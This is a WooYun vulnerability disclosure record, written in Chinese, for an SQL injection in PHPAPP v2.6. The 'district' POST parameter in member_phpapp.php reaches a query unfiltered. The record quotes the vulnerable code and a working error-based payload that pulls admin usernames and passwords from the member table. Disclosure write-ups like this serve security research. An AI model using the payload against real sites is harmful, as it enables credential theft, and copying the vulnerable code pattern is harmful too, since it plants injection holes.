{"id": 41470, "wybug_id": "wooyun-2014-088700", "wybug_title": "PHPAPP注入第六枚（无视过滤）", "wybug_corp": "PHPAPP", "wybug_author": "路人甲", "wybug_date": "2014-12-29 11:20", "wybug_open_date": "2015-03-29 11:22", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPAPP注入第六枚（无视过滤） 详细说明：  在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com/member.php?action=3&app=70&type=12 , 存在漏洞的文件在/phpapp/apps/map/member_phpapp.php 来看看漏洞是如何产生的/phpapp/apps/map/member_phpapp.php \nfunction SetMapInfoAction(){\t\t\t\t  //地图反地址\t\t  if($this->GET['type']){\t\t\t  \t\t\t\t//print_r($this->POST);\t\t\t\tif($this->POST['district']){\t\t\t\t\t  $searchsql=sprintf(\"WHERE name REGEXP '%s'\",$this->POST['district']);\t\t\t\t\t \t\t\t\t\t  $category=$this->GetMysqlOne('catid',\" \".$this->GetTable('category_city').\" $searchsql\");\t\t\t\t\t  \t\t\t\t\t  if($category){\t\t\t\t\t\t\t\t\t\t\t\t\t\techo $this->GetSelectCategory('category_city',intval($category['catid']),'showselectcity');\t\t\t\t\t\t  \t\t\t\t\t  }\t\t\t\t}\t\t\t\t\t\t\t  \t\t  }else{\t\t\t\t  \t\t  }\t\t\t}}\n在把$_POST的值赋$this->POST时，对类似于’string_s’的参数进行了过滤，只要结尾不是’_s’就可以绕过过滤。可以看到：$this->POST['district']拼接成了$searchsql，然后带入了GetMysqlOne，看看GetMysqlOne\n//读取单条数组\tpublic function GetMysqlOne($key='*',$whereif=''){\t\t  \t     $sqldata= array();\t  \t     $query=sprintf('SELECT %s FROM %s',$key,$whereif);\t     $sqldata=mysql_fetch_array($this->MysqlQuery($query),MYSQL_ASSOC);\t     if (is_array($sqldata)){ \t\t       return $sqldata;\t     }else{\t           return false;\t     }     }\n没有过滤，直接拼接后执行SQL,造成注入Phpapp可以显错，那就用error-based blind进行注入。Pyload：(POST提交)\ndistrict=123' or (select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(0x23,username,0x23,password) from phpapp_member limit 0,1))a from phpapp_member group by a)b) or'\n注入成功，管理员用户名及密码如下图中所示：\n\n   漏洞证明：  见 详细说明   修复方案：  $this->str()   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}